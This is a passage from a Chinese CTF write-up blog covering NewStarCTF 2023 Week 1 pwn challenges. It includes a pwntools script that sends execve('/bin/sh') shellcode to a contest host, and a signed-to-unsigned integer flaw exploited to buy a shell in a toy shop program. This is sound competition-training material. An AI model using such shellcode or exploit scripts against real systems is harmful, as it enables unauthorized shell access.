class="hljs-number">0x66660000</span>, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">7</span>, <span class="hljs-number">50</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to NewStar CTF!!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Show me your magic&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x100</span>uLL);<br>  JUMPOUT(<span class="hljs-number">0x66660000</span>LL);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>直接写shellcode即可，网上随便搜一个shellcode，编写脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># shellcode</span><br>shellcode = <span class="hljs-string">b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&#x27;</span><br><br><span class="hljs-comment"># 启动进程</span><br>r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28681</span>)<br><br><span class="hljs-comment"># 读取欢迎信息</span><br><span class="hljs-built_in">print</span>(r.recv())<br><br><span class="hljs-comment"># 写入shellcode到内存块</span><br>r.sendline(shellcode)<br><br>r.interactive()<br><br><span class="hljs-comment"># 关闭进程</span><br>r.close()<br></code></pre></td></tr></table></figure>

<p>直接cat flag</p>
<h3 id="newstar-shop"><a href="#newstar-shop" class="headerlink" title="newstar shop"></a>newstar shop</h3><p>主函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+4h] [rbp-Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  init(argc, argv, envp);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    menu();<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)__isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v3) &lt;= <span class="hljs-number">0</span> )<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid input&quot;</span>);<br>    <span class="hljs-keyword">switch</span> ( v3 )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        shop();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        makemoney();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        dont_try();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;nothing here&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>menu()</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">menu</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 v1; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v1 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;=================&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1.Go to the shop &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2.Make some money&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3.Don&#x27;t choose   &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;=================&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>  <span class="hljs-keyword">return</span> v1 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>shop()</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">shop</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;=============================&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;===Welcome to newstar shop===&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;=============================&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1.newstar&#x27;s gift          20$&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2.pwn write up            40$&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3.shell                 9999$&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;All things are only available for one day!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What do you want to buy?&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)__isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1) &lt;= <span class="hljs-number">0</span> )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid input&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( v1 != <span class="hljs-number">3</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( v1 &gt; <span class="hljs-number">3</span> )<br>    &#123;<br>LABEL_17:<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;nothing here&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>      <span class="hljs-keyword">return</span> v2 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v1 == <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)money &gt; <span class="hljs-number">0x13</span> )<br>      &#123;<br>        money -= <span class="hljs-number">20</span>;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You buy a newstar&#x27;s gift&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;That is the gift:&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What will happen when int transfer to unsigned int?&quot;</span>);<br>        <span class="hljs-keyword">goto</span> LABEL_10;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v1 != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_17;<br>      <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)money &gt; <span class="hljs-number">0x27</span> )<br>      &#123;<br>        money -= <span class="hljs-number">40</span>;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You buy a pwn write up&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;That is free after the match,haha&quot;</span>);<br>        <span class="hljs-keyword">goto</span> LABEL_10;<br>      &#125;<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Sorry,you don&#x27;t have enough money&quot;</span>);<br>LABEL_10:<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> v2 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)money &gt; <span class="hljs-number">0x270E</span> )<br>  &#123;<br>    money = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;How do you buy it?&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Sorry,you don&#x27;t have enough money&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> v2 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>makemoney()</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">makemoney</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;============================&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;==========Job list==========&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;============================&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1.McDonald part time job 20$&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2.MeiTuan takeout        40$&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3.Giving out leaflets    60$&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What do you want to do?&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)__isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1) &lt;= <span class="hljs-number">0</span> )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid input&quot;</span>);<br>  <span class="hljs-keyword">switch</span> ( v1 )<br>  &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>      <span class="hljs-keyword">if</span> ( hour &lt;= <span class="hljs-number">3</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_12;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You chose McDonald&#x27;s part time job&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;It took you 4hours and earned 20$&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>      hour -= <span class="hljs-number">4</span>;<br>      money += <span class="hljs-number">20</span>;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>      <span class="hljs-keyword">if</span> ( hour &lt;= <span class="hljs-number">7</span> )<br>      &#123;<br>LABEL_12:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You need to rest&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> v2 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>      &#125;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You chose MeiTuan takeout&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;It took you 8hours and earned 40$&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>      hour -= <span class="hljs-number">8</span>;<br>      money += <span class="hljs-number">40</span>;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>      <span class="hljs-keyword">if</span> ( hour &gt; <span class="hljs-number">11</span> )<br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You chose giving out leaflets&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;It took you 12hours and earned 60$&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>        hour -= <span class="hljs-number">12</span>;<br>        money += <span class="hljs-number">60</span>;<br>        <span class="hljs-keyword">return</span> v2 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>      &#125;<br>      <span class="hljs-keyword">goto</span> LABEL_12;<br>    <span class="hljs-keyword">default</span>:<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;nothing here&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>      <span class="hljs-keyword">return</span> v2 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>  &#125;<br>  <span class="hljs-keyword">return</span> v2 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>dont_try()</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">dont_try</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 v1; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v1 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( chance )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You shouldn&#x27;t choose this&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please remember, the shop owner doesn&#x27;t like his secret to be found&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;To punish your choice, you will lose 50$ and you will never be able to choose it!&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    money -= <span class="hljs-number">50</span>;<br>    --chance;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v1 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>原理：有符号型负数int转化为无符号int会导致无符号int数值特别大</p>
<p>因此，先把所有money花光，之后去dont_try()函数减钱，将其变成负数，即可买到shell</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>作为新生赛，还是比较简单的，对初学者比较友好。</p>
<p>贴一个官方wp：<a target="_blank" rel="noopener" href="https://shimo.im/docs/XKq421EBKzFyRzAN/read">NewStarCTF 2023 Week1 官方WriteUp (shimo.im)</a></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/WriteUp/" class="category-chain-item">WriteUp</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/web/" class="print-no-link">#web</a>
      
        <a href="/tags/reverse/" class="print-no-link">#reverse</a>
      
        <a href="/tags/misc/" class="print-no-link">#misc</a>
      
        <a href="/tags/pwn/" class="print-no-link">#pwn</a>
      
        <a href="/tags/crypto/" class="print-no-link">#crypto</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>NewStarCTF 2023-WEEK1 WriteUp</div>
      <div>https://blog.lazyforever.top/2023/09/26/2023newstarctfWeek1/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>lazy_forever</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年9月26日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/10/10/2023newstarctfWeek2/" title="NewStarCTF 2023-WEEK2 Web WriteUp">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">NewStarCTF 2023-WEEK2 Web WriteUp</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/09/19/2023tianjindawd/" title="天津市大学生信息安全网络攻防大赛">
                        <span class="hidden-mobile">天津市大学生信息安全网络攻防大赛</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="twikoo"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#comments', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/twikoo/1.6.8/twikoo.all.min.js', function() {
        var options = Object.assign(
          {"envId":"https://twikoo.lazyforever.top/","region":null,"path":null},
          {
            el: '#twikoo',
            path: '',
            onCommentLoaded: function() {
              Fluid.utils.listenDOMLoaded(function() {
                var imgSelector = '#twikoo .tk-content img:not(.tk-owo-emotion)';
                Fluid.plugins.imageCaption(imgSelector);
                Fluid.plugins.fancyBox(imgSelector);
              });
            }
          }
        )
        twikoo.init(options)
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量 
        <span id="busuanzi_value_site_pv"></span>
         次
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数 
        <span id="busuanzi_value_site_uv"></span>
         次
      </span>
    
    
  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body>
</html>
